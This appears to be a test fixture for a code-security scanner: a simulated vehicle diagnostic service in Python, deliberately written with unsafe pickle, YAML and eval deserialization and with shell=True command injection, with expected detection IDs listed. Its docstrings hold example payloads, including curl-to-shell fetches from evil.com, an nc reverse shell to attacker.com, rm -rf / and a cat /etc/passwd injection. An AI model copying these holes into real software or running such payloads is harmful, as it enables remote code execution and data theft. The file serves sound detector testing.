"""Test: Unsafe Deserialization + Code Injection.

Expected detections:
  - CODE-001: Command injection via subprocess shell=True
  - CODE-005: Unsafe deserialization (pickle.loads, yaml.load, eval)
  - CODE-038: eval() of decoded payload

This file simulates a vehicle diagnostic service that processes
incoming data in dangerously trusting ways.
"""

import base64
import pickle
import subprocess
import yaml


def process_diagnostic_payload(raw_bytes: bytes) -> dict:
    """CODE-005: pickle.loads on network input = Remote Code Execution.
    
    Attacker crafts a pickle payload that executes arbitrary code
    during deserialization (e.g., os.system('curl evil.com | sh')).
    """
    return pickle.loads(raw_bytes)


def load_vehicle_config(config_str: str) -> dict:
    """CODE-005: yaml.load without SafeLoader = arbitrary code exec.
    
    YAML allows !!python/object tags that instantiate any class.
    Attacker: '!!python/object/apply:os.system ["rm -rf /"]'
    """
    return yaml.load(config_str, Loader=yaml.Loader)


def execute_remote_command(encoded_cmd: str) -> str:
    """CODE-038: eval() on base64-decoded user input = RCE.
    
    Attacker base64-encodes: __import__('os').system('whoami')
    """
    decoded = base64.b64decode(encoded_cmd).decode("utf-8")
    result = eval(decoded)
    return str(result)


def run_diagnostic_tool(tool_name: str, vin: str) -> str:
    """CODE-001: shell=True with user-controlled string.
    
    Attacker sets tool_name to: 'legit; cat /etc/passwd'
    or vin to: 'WBA123$(curl evil.com/shell.sh|sh)'
    """
    cmd = f"diag-tool --name={tool_name} --vin={vin} --verbose"
    return subprocess.check_output(cmd, shell=True, text=True)


def dynamic_formula_eval(formula: str, sensor_values: dict) -> float:
    """CODE-005: eval() on user-supplied formula string.
    
    Intended: "speed * 3.6" with sensor_values = {"speed": 25.0}
    Attacker: "__import__('os').system('nc -e /bin/sh attacker.com 4444')"
    """
    return eval(formula, {"__builtins__": {}}, sensor_values)


if __name__ == "__main__":
    # Normal usage — but all of these are exploitable
    print(run_diagnostic_tool("battery_check", "WBA12345678901234"))
    config = load_vehicle_config("model: X5\nyear: 2024\n")
    print(config)
